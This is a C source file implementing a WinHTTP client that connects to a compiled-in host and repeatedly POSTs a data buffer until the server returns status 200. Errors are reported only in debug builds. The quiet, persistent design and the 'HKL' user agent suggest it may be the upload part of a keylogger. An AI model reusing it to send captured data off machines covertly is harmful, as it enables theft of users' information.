#include "connection.h"

void initSession()
{
	while (TRUE)
	{
		hSession = WinHttpOpen(L"HKL/1.0.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		if (hSession == NULL)
		{
#ifdef DEBUG
			handleError("WinHttpOpen");
#endif
			Sleep(100);
			continue;
		}
		break;
	}
}

void initConnection()
{
	while (TRUE)
	{
		if (hSession == NULL)
			initSession();
		hConnect = WinHttpConnect(hSession, HOSTNAME, PORT, 0);
		if (hConnect == NULL)
		{
#ifdef DEBUG
			handleError("WinHttpConnect");
#endif
			hSession = NULL;
			Sleep(100);
			continue;
		}
		break;
	}
}

void sendData(LPSTR buffer, DWORD size)
{
	BOOL err = FALSE;
	while (TRUE)
	{
		if (hConnect == NULL)
			initConnection();
		HANDLE hRequest = WinHttpOpenRequest(hConnect, L"POST", PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 00);
		if (hRequest == NULL)
		{
#ifdef DEBUG
			handleError("WinHttpOpenRequest");
#endif
			hConnect = NULL;
			Sleep(300);
			continue;
		}

		DWORD dataSize = sizeof("data=") + size - 1;
		LPSTR data = malloc(dataSize);
		if (data == NULL)
		{
#ifdef DEBUG
			fputs("malloc Failed!", stderr);
#endif
			Sleep(100);
			WinHttpCloseHandle(hRequest);
			continue;
		}

		sprintf_s(data, dataSize, "data=%s", buffer);

		WCHAR headers[] = L"Content-Type: application/x-www-form-urlencoded\r\n";
		err = WinHttpSendRequest(hRequest, headers, sizeof(headers)/sizeof(WCHAR)-1, data, dataSize - 1, dataSize - 1, 0);
		if (err != TRUE)
		{
#ifdef DEBUG
			handleError("WinHttpSendRequest");
#endif
			free(data);
			Sleep(500);
			WinHttpCloseHandle(hRequest);
			continue;
		}

		err = WinHttpReceiveResponse(hRequest, NULL);
		if (err != TRUE)
		{
#ifdef DEBUG
			handleError("WinHttpReceiveRequest");
#endif
			free(data);
			Sleep(500);
			WinHttpCloseHandle(hRequest);
			continue;
		}

		DWORD statusCode = 0;
		DWORD scSize = sizeof(statusCode);

		err = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &scSize, WINHTTP_NO_HEADER_INDEX);
		if (err != TRUE)
		{
#ifdef DEBUG
			handleError("WinHttpQueryHeaders");
#endif
			free(data);
			Sleep(500);
			WinHttpCloseHandle(hRequest);
			continue;
		}
		if (statusCode != 200)
		{
#ifdef DEBUG
			fprintf(stderr, "Request Failed! Status Code: %d", statusCode);
#endif
			free(data);
			Sleep(500);
			WinHttpCloseHandle(hRequest);
			continue;
		}

		free(data);
		WinHttpCloseHandle(hRequest);
		break;
	}
}
